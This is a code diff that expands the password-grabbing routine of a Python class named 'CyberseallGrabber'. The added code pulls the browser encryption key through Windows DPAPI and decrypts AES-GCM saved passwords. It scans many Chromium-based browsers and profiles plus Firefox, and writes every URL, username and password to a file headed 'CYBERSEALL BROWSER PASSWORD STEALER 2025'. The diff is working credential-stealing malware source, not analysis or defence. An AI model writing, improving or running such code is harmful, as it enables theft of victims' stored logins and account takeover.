@@ -173,163 +173,383 @@ class CyberseallGrabber:
         try:
             pw_data = []
             
-            def get_master_key(browser_path):
+            def get_encryption_key(browser_path):
+                """Extrahiert den Verschlüsselungsschlüssel aus Local State"""
                 try:
-                    local_state_path = os.path.join(browser_path, "Local State")
-                    if not os.path.exists(local_state_path):
+                    local_state_file = os.path.join(browser_path, "Local State")
+                    if not os.path.exists(local_state_file):
                         return None
-                    with open(local_state_path, "r", encoding="utf-8") as f:
-                        local_state = json.loads(f.read())
-                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
-                    encrypted_key = base64.b64decode(encrypted_key.encode("utf-8"))
-                    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
-                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                    
+                    with open(local_state_file, "r", encoding="utf-8") as f:
+                        local_state_data = json.loads(f.read())
+                    
+                    # Extrahiere verschlüsselten Schlüssel
+                    encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
+                    encrypted_key_bytes = base64.b64decode(encrypted_key)
+                    
+                    # Entferne DPAPI Präfix (erste 5 Bytes: "DPAPI")
+                    encrypted_key_bytes = encrypted_key_bytes[5:]
+                    
+                    # Entschlüssele mit Windows DPAPI
+                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key_bytes, None, None, None, 0)[1]
                     return decrypted_key
+                    
                 except Exception as e:
                     return None
             
-            def decrypt_password(encrypted_password, master_key):
+            def decrypt_chrome_password(encrypted_password, key):
+                """Entschlüsselt Chrome/Chromium Passwörter"""
                 try:
-                    # Check if password is encrypted with new method (AES)
-                    if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
-                        # Extract IV and encrypted data
-                        iv = encrypted_password[3:15]
-                        encrypted_data = encrypted_password[15:-16]  # Remove tag
+                    if not encrypted_password:
+                        return ""
+                    
+                    # Prüfe Verschlüsselungsversion
+                    if encrypted_password[:3] == b'v10':
+                        # Neue AES-GCM Verschlüsselung (Chrome 80+)
+                        nonce = encrypted_password[3:15]  # 12 Bytes Nonce
+                        ciphertext = encrypted_password[15:]  # Rest ist verschlüsselter Text
                         
-                        # Decrypt using AES-GCM
-                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
-                        decrypted_password = cipher.decrypt(encrypted_data)
+                        # AES-GCM Entschlüsselung
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                        decrypted_password = cipher.decrypt(ciphertext[:-16])  # Entferne Auth-Tag
                         return decrypted_password.decode('utf-8')
+                        
+                    elif encrypted_password[:3] == b'v11':
+                        # Neueste Verschlüsselung (Chrome 100+)
+                        nonce = encrypted_password[3:15]
+                        ciphertext = encrypted_password[15:]
+                        
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                        decrypted_password = cipher.decrypt(ciphertext[:-16])
+                        return decrypted_password.decode('utf-8')
+                        
                     else:
-                        # Old method - use DPAPI
+                        # Alte DPAPI Verschlüsselung (Chrome <80)
                         decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                         return decrypted_password.decode('utf-8')
+                        
                 except Exception as e:
+                    # Fallback: Versuche direkte DPAPI Entschlüsselung
                     try:
-                        # Fallback: try DPAPI directly
                         decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                         return decrypted_password.decode('utf-8')
                     except:
-                        return "Failed to decrypt"
+                        return "DECRYPTION_FAILED"
             
-            # Browser configurations
-            browsers = [
+            def extract_firefox_passwords():
+                """Extrahiert Passwörter aus Firefox"""
+                firefox_passwords = []
+                try:
+                    firefox_profile_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
+                    if not os.path.exists(firefox_profile_path):
+                        return firefox_passwords
+                    
+                    for profile_folder in os.listdir(firefox_profile_path):
+                        profile_path = os.path.join(firefox_profile_path, profile_folder)
+                        if not os.path.isdir(profile_path):
+                            continue
+                        
+                        # Suche nach logins.json
+                        logins_file = os.path.join(profile_path, "logins.json")
+                        if os.path.exists(logins_file):
+                            try:
+                                with open(logins_file, "r", encoding="utf-8") as f:
+                                    logins_data = json.loads(f.read())
+                                
+                                for login in logins_data.get("logins", []):
+                                    hostname = login.get("hostname", "")
+                                    username = login.get("encryptedUsername", "")
+                                    password = login.get("encryptedPassword", "")
+                                    
+                                    if hostname and username:
+                                        # Firefox Passwörter sind komplex verschlüsselt, zeige als verschlüsselt an
+                                        firefox_passwords.append(f"Firefox | {hostname} | {username} | [FIREFOX_ENCRYPTED]")
+                            except:
+                                continue
+                                
+                except Exception as e:
+                    pass
+                
+                return firefox_passwords
+            
+            # Umfassende Browser-Konfiguration für 2025
+            browser_configs = [
+                # Google Chrome Varianten
                 {
-                    "name": "Chrome",
-                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
-                    "login_data": "Login Data"
+                    "name": "Google Chrome",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 2"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 3"),
+                    ],
+                    "login_file": "Login Data"
                 },
                 {
                     "name": "Chrome Canary",
-                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default"),
-                    "login_data": "Login Data"
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Profile 1"),
+                    ],
+                    "login_file": "Login Data"
                 },
+                {
+                    "name": "Chrome Beta",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                {
+                    "name": "Chrome Dev",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                # Microsoft Edge Varianten
                 {
                     "name": "Microsoft Edge",
-                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
-                    "login_data": "Login Data"
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Profile 1"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Profile 2"),
+                    ],
+                    "login_file": "Login Data"
                 },
                 {
-                    "name": "Brave",
-                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
-                    "login_data": "Login Data"
+                    "name": "Edge Beta",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
                 },
+                {
+                    "name": "Edge Dev",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                {
+                    "name": "Edge Canary",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge SxS", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                # Brave Browser
+                {
+                    "name": "Brave Browser",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Profile 1"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Dev", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                # Opera Varianten
                 {
                     "name": "Opera",
-                    "path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-                    "login_data": "Login Data"
+                    "paths": [
+                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Next"),
+                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
+                    ],
+                    "login_file": "Login Data"
                 },
                 {
                     "name": "Opera GX",
-                    "path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-                    "login_data": "Login Data"
+                    "paths": [
+                        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
+                    ],
+                    "login_file": "Login Data"
                 },
+                # Vivaldi
                 {
                     "name": "Vivaldi",
-                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
-                    "login_data": "Login Data"
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Profile 1"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi-Snapshot", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                # Yandex Browser
+                {
+                    "name": "Yandex Browser",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Profile 1"),
+                    ],
+                    "login_file": "Ya Passman Data"
+                },
+                # Weitere Chromium-basierte Browser
+                {
+                    "name": "Chromium",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
                 },
                 {
-                    "name": "Yandex",
-                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
-                    "login_data": "Ya Passman Data"
+                    "name": "Arc Browser",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Arc", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                {
+                    "name": "Thorium",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "Thorium", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
+                },
+                {
+                    "name": "Ungoogled Chromium",
+                    "paths": [
+                        os.path.join(os.getenv("LOCALAPPDATA"), "ungoogled-chromium", "User Data", "Default"),
+                    ],
+                    "login_file": "Login Data"
                 }
             ]
             
-            for browser in browsers:
-                try:
-                    browser_name = browser["name"]
-                    browser_path = browser["path"]
-                    login_data_file = browser["login_data"]
-                    
-                    # Check if browser exists
-                    if not os.path.exists(browser_path):
-                        continue
-                    
-                    # Get master key for decryption
-                    master_key = get_master_key(browser_path)
-                    if not master_key:
-                        continue
-                    
-                    # Path to login data
-                    login_data_path = os.path.join(browser_path, login_data_file)
-                    if not os.path.exists(login_data_path):
-                        continue
-                    
-                    # Copy database to temp location to avoid locks
-                    temp_db_path = os.path.join(os.getenv("TEMP"), f"{browser_name.replace(' ', '_')}_passwords_{os.getpid()}.db")
+            # Durchsuche alle Browser-Konfigurationen
+            for browser_config in browser_configs:
+                browser_name = browser_config["name"]
+                browser_paths = browser_config["paths"]
+                login_file = browser_config["login_file"]
+                
+                for browser_path in browser_paths:
                     try:
-                        shutil.copy2(login_data_path, temp_db_path)
-                    except:
-                        continue
-                    
-                    # Connect to database and extract passwords
-                    try:
-                        conn = sqlite3.connect(temp_db_path)
-                        cursor = conn.cursor()
+                        # Prüfe ob Browser-Pfad existiert
+                        if not os.path.exists(browser_path):
+                            continue
                         
-                        # Query for login data
-                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' AND password_value != ''")
+                        # Hole Verschlüsselungsschlüssel
+                        encryption_key = get_encryption_key(browser_path)
+                        if not encryption_key:
+                            continue
                         
-                        for row in cursor.fetchall():
-                            origin_url = row[0]
-                            username = row[1]
-                            encrypted_password = row[2]
+                        # Pfad zur Login-Datenbank
+                        login_db_path = os.path.join(browser_path, login_file)
+                        if not os.path.exists(login_db_path):
+                            continue
+                        
+                        # Erstelle temporäre Kopie der Datenbank
+                        temp_db_name = f"{browser_name.replace(' ', '_')}_{hash(browser_path)}_{os.getpid()}.db"
+                        temp_db_path = os.path.join(os.getenv("TEMP"), temp_db_name)
+                        
+                        try:
+                            shutil.copy2(login_db_path, temp_db_path)
+                        except Exception as e:
+                            continue
+                        
+                        # Verbinde zur Datenbank und extrahiere Passwörter
+                        try:
+                            connection = sqlite3.connect(temp_db_path)
+                            cursor = connection.cursor()
                             
-                            if origin_url and username and encrypted_password:
-                                # Decrypt password
-                                decrypted_password = decrypt_password(encrypted_password, master_key)
+                            # Erweiterte SQL-Abfrage für alle möglichen Felder
+                            query = """
+                            SELECT 
+                                origin_url, 
+                                action_url, 
+                                username_value, 
+                                password_value,
+                                date_created,
+                                date_last_used,
+                                times_used
+                            FROM logins 
+                            WHERE username_value != '' OR password_value != ''
+                            ORDER BY date_last_used DESC
+                            """
+                            
+                            cursor.execute(query)
+                            login_records = cursor.fetchall()
+                            
+                            for record in login_records:
+                                origin_url = record[0] or "Unknown URL"
+                                action_url = record[1] or ""
+                                username = record[2] or "No Username"
+                                encrypted_password = record[3]
+                                date_created = record[4] or 0
+                                date_last_used = record[5] or 0
+                                times_used = record[6] or 0
                                 
-                                # Format and add to results
-                                password_entry = f"{browser_name} | {origin_url} | {username} | {decrypted_password}"
+                                # Entschlüssele Passwort
+                                if encrypted_password:
+                                    decrypted_password = decrypt_chrome_password(encrypted_password, encryption_key)
+                                else:
+                                    decrypted_password = "No Password"
+                                
+                                # Formatiere Passwort-Eintrag
+                                profile_name = os.path.basename(browser_path) if os.path.basename(browser_path) != browser_name else "Default"
+                                password_entry = f"{browser_name} ({profile_name}) | {origin_url} | {username} | {decrypted_password}"
+                                
+                                # Füge zusätzliche Informationen hinzu wenn verfügbar
+                                if times_used > 0:
+                                    password_entry += f" | Used: {times_used}x"
+                                
                                 pw_data.append(password_entry)
+                            
+                            connection.close()
+                            
+                        except Exception as e:
+                            if 'connection' in locals():
+                                try:
+                                    connection.close()
+                                except:
+                                    pass
                         
-                        conn.close()
-                        
+                        # Lösche temporäre Datei
+                        try:
+                            os.remove(temp_db_path)
+                        except:
+                            pass
+                            
                     except Exception as e:
-                        if 'conn' in locals():
-                            conn.close()
                         continue
-                    
-                    # Clean up temp file
-                    try:
-                        os.remove(temp_db_path)
-                    except:
-                        pass
-                        
-                except Exception as e:
-                    continue
             
-            # Save passwords to file
+            # Füge Firefox Passwörter hinzu
+            firefox_passwords = extract_firefox_passwords()
+            pw_data.extend(firefox_passwords)
+            
+            # Speichere alle gefundenen Passwörter
             self.p = pw_data
+            
             if pw_data:
                 try:
                     with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
-                        f.write("=== BROWSER PASSWORDS ===\n\n")
+                        f.write("=" * 60 + "\n")
+                        f.write("🔥 CYBERSEALL BROWSER PASSWORD STEALER 2025 🔥\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        # Gruppiere Passwörter nach Browser
+                        browser_groups = {}
                         for password in pw_data:
-                            f.write(password + "\n")
-                        f.write(f"\n=== TOTAL: {len(pw_data)} PASSWORDS ===")
-                except:
+                            browser = password.split(" |")[0]
+                            if browser not in browser_groups:
+                                browser_groups[browser] = []
+                            browser_groups[browser].append(password)
+                        
+                        for browser, passwords in browser_groups.items():
+                            f.write(f"\n🌐 {browser.upper()} ({len(passwords)} passwords)\n")
+                            f.write("-" * 50 + "\n")
+                            for password in passwords:
+                                f.write(password + "\n")
+                            f.write("\n")
+                        
+                        f.write("=" * 60 + "\n")
+                        f.write(f"📊 TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
+                        f.write(f"🔍 BROWSERS SCANNED: {len(browser_groups)}\n")
+                        f.write("=" * 60 + "\n")
+                        
+                except Exception as e:
                     pass
             
         except Exception as e:
